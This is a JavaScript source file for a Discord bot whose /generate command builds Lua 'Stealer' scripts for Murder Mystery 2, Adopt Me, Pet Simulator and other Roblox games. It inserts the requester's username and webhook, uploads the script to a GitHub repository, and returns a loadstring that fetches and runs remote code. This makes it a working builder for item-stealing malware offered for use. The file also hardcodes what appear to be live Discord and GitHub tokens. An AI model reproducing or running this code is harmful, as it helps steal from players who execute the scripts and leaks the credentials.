import { Client, GatewayIntentBits, SlashCommandBuilder } from 'discord.js';
import fetch from 'node-fetch'; // For making HTTP requests to GitHub API

// Tokens and IDs (replace with your actual values)
const BOT_TOKEN = 'MTMwMDY1MzExOTcyNTYzMzY0Nw.GpOSZj.OtHwQAni4pWmVoHXjuSa0pJ04xk_W7JiB-MC5I'; // Replace with your Discord bot token
const GITHUB_TOKEN = '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'; // Replace with your GitHub token
const GUILD_ID = '1306839514039189504'; // Replace with your Guild ID
const REPO_OWNER = 'VOIDZ'; // Replace with your GitHub repository owner
const REPO_NAME = 'VOIDSCRIPTS'; // Replace with your GitHub repository name

// Create the Discord bot client
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

// When the bot is ready
client.once('ready', () => {
  console.log(`${client.user.tag} is online!`);
});

// Slash command registration
client.once('ready', async () => {
  console.log(`${client.user.tag} is ready!`);

  const data = [
    new SlashCommandBuilder()
      .setName('generate')
      .setDescription('Generate a Stealer script for MM2 and other games.')
      .addStringOption((option) =>
        option.setName('username').setDescription('Your Roblox Username').setRequired(true)
      )
      .addStringOption((option) =>
        option.setName('webhook').setDescription('Your Webhook URL').setRequired(true)
      ),
  ];

  // Fetch the guild asynchronously
  try {
    const guild = await client.guilds.fetch(GUILD_ID); // Use async fetch for the guild
    if (guild) {
      await guild.commands.set(data);
      console.log('Slash commands registered!');
    }
  } catch (error) {
    console.error('Error fetching the guild:', error);
  }
});

// Handle slash command interactions
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'generate') {
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    // Updated script content following the provided Lua template
    const scriptContent = `
-- Generated Script
local Username = "${username}"
local Webhook = "${webhook}"

-- Minimum RAP configuration
local MinimumRAP = 500000

-- Executing the script from GitHub repository
loadstring(game:HttpGet('https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/refs/heads/main/VOIDSCRIPTS'))()
`;

    const fileName = `GeneratedScript${Math.floor(Math.random() * 1000000)}.lua`;

    // Upload the generated script to GitHub
    const uploadResponse = await fetch(
      `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/lua/${fileName}`,
      {
        method: 'PUT',
        headers: {
          Authorization: `token ${GITHUB_TOKEN}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message: `Add generated script: ${fileName}`,
          content: Buffer.from(scriptContent).toString('base64'),
        }),
      }
    );

    const uploadResult = await uploadResponse.json();
    const downloadUrl = uploadResult.content?.download_url;

    if (downloadUrl) {
      // Construct the loadstring for the response
      const loadstring = `loadstring(game:HttpGet("${downloadUrl}", true))()`;

      // Supported games list
      const supportedGames = [
        'Adopt Me',
        'Anime Defenders',
        'Bee Swarm Simulator',
        'Blade Ball',
        'Blox Fruits',
        'Bubble Gum Simulator',
        'Da Hood',
        'Murder Mystery 2',
        'Pet Simulator 99',
        'Pet Simulator X',
        'Pets Go',
        'Toilet Tower Defense',
        'Five Night Tower Defense',
      ];

      // Send the response to the user with the loadstring and supported games
      await interaction.reply({
        content: `Generated script! Use the following:\n\`\`\`lua\n${loadstring}\n\`\`\`\n\n**Supported Games**:\n${supportedGames.map((game) => `✅ ${game}`).join('\n')}`,
        ephemeral: true,
      });
    } else {
      // If there's an error uploading the script
      await interaction.reply({
        content: 'Error uploading script to GitHub.',
        ephemeral: true,
      });
    }
  }
});

// Log in to Discord using the bot token
client.login(BOT_TOKEN);
